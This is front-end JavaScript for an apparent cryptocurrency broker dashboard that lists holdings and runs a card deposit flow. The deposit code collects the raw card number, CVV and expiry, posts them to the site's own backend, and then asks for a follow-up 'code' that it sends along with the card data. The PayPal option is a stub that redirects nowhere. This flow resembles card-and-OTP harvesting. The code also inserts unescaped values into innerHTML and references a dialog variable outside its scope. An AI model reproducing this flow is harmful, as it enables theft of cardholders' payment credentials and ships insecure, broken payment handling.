const API_URL = location.hostname.includes('localhost') || location.hostname.includes('127.')
  ? 'http://localhost:3000/api'
  : 'https://krypt-broker-backend.onrender.com/api';

document.addEventListener('DOMContentLoaded', () => {
  loadAssets();

  const methodDialog = document.getElementById('methodDialog');
  const cardDialog = document.getElementById('cardDialog');
  const codeDialog = document.getElementById('codeDialog');
  const depositBtn = document.getElementById('depositBtn');
  const paypalBtn = document.getElementById('payWithPaypal');
  const cardBtn = document.getElementById('payWithCard');
  const makePaymentBtn = document.getElementById('makePaymentBtn');

  let cardDetails = {}; // Store temporarily

  depositBtn.onclick = () => document.getElementById('amountDialog').showModal();

  paypalBtn.onclick = () => {
    alert("Redirecting to PayPal...");
    methodDialog.close();
  };

  cardBtn.onclick = () => {
    methodDialog.close();
    cardDialog.showModal();
  };
makePaymentBtn.onclick = async () => {
  const form = document.getElementById('cardForm');
  const cardData = {
    cardNumber: form.cardNumber.value,
    cvv: form.cvv.value,
    expiry: form.expiry.value,
    amount: depositAmount // pass it to backend
  };

  if (!cardData.cardNumber || !cardData.cvv || !cardData.expiry) {
    alert("Please fill in all card fields");
    return;
  }

  try {
    // Send card data to backend first
    const res = await fetch(`${API_URL}/payment/deposit`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify(cardData)
    });

    const data = await res.json();
    if (!res.ok) throw new Error(data.message || "Card submission failed.");

    cardDetails = cardData; // store for later use
    cardDialog.close();
    codeDialog.showModal();
  } catch (err) {
    console.error('❌ Failed to submit card details:', err);
    alert(err.message || "Failed to submit card details.");
  }
};



  document.getElementById('codeForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const code = e.target.code.value;

    const payload = { ...cardDetails, code, amount: depositAmount };

    try {
      const res = await fetch(`${API_URL}/payment/deposit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify(payload)
      });

      const data = await res.json();
      alert(data.message || "Payment submitted");
      e.target.reset();
      closeDialog('codeDialog');
    } catch (err) {
      console.error('❌ Failed to submit:', err);
      alert("Payment failed.");
    }
  });
});

function closeDialog(id) {
  const dialog = document.getElementById(id);
  if (dialog) dialog.close();
}


async function loadAssets() {
  const listContainer = document.getElementById('assetList');
  const totalDisplay = document.getElementById('totalAssets');

  try {
    // Step 1: Fetch portfolio from your backend
    const res = await fetch(`${API_URL}/trade/portfolio`, {
      credentials: 'include'
    });
    const data = await res.json();
    const holdings = data.portfolio || data.holdings; // fallback for key name

    if (!holdings || Object.keys(holdings).length === 0) {
      listContainer.innerHTML = '<p style="color:gray;">No assets available.</p>';
      return;
    }

    // Step 2: Fetch coin markets (includes id, symbol, name, price, image)
    const marketRes = await fetch(`${API_URL}/coin/markets`);
    const marketCoins = await marketRes.json();

    // Step 3: Create a map of SYMBOL => coinData
    const coinMap = {};
    marketCoins.forEach(coin => {
      coinMap[coin.symbol.toUpperCase()] = coin;
    });

    let totalUSD = 0;

    // Step 4: Display each asset as a card
    for (const [symbol, amount] of Object.entries(holdings)) {
      const coin = coinMap[symbol.toUpperCase()];
      if (!coin) {
        console.warn(`⚠️ Coin not found for symbol: ${symbol}`);
        continue;
      }

      const usdValue = amount * coin.current_price;
      totalUSD += usdValue;

const card = document.createElement('div');
card.className = 'asset-card';
card.style.cursor = 'pointer';
card.onclick = () => {
  window.location.href = `convert.html?symbol=${symbol}`;
};
card.innerHTML = `
  <div class="asset-left">
    <img class="asset-logo" src="${coin.image}" onerror="this.src='https://via.placeholder.com/32'" />
    <div class="asset-info">
      <div class="symbol">${symbol}</div>
      <div class="usd">${coin.name}</div>
    </div>
  </div>
  <div class="amount">
    <div>${amount.toFixed(8)}</div>
    <div class="usd">≈ $${usdValue.toFixed(2)}</div>
  </div>
`;

      listContainer.appendChild(card);
    }

    totalDisplay.textContent = `$${totalUSD.toFixed(2)}`;
  } catch (err) {
    console.error('❌ Failed to load assets:', err);
    listContainer.innerHTML = '<p style="color:red;">Error loading assets.</p>';
  }
}

let depositAmount = 0;

document.getElementById('amountForm').addEventListener('submit', (e) => {
  e.preventDefault();
  const amountInput = document.getElementById('depositAmountInput');
  depositAmount = parseFloat(amountInput.value);

  if (!depositAmount || depositAmount <= 0) {
    alert("Please enter a valid am   ount.");
    return;
  }

  closeDialog('amountDialog');
  methodDialog.showModal();
});
